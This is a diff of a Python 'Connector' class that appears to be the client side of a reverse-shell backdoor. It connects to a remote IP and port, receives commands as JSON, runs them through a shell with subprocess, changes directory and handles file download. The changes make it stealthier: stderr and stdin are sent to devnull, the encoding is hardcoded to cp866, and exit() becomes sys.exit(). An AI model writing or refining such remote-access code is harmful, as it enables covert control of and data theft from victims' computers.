@@ -8,19 +8,20 @@ class Connector:
         self.connection.connect((ip, port))
 
     def reliable_send(self, data):
-        self.connection.send(json.dumps(data, encoding=sys.stdout.encoding))
+        self.connection.send(json.dumps(data, encoding="cp866"))
 
     def reliable_receive(self):
         json_data = ""
         while True:
             try:
                 json_data += self.connection.recv(1380)
-                return json.loads(json_data, encoding=sys.stdout.encoding)
+                return json.loads(json_data, encoding="cp866")
             except ValueError:
                 continue
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        with open(os.devnull, "wb") as devnull:
+            return subprocess.check_output(command, shell=True, stderr=devnull, stdin=devnull)
 
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -41,7 +42,7 @@ class Connector:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
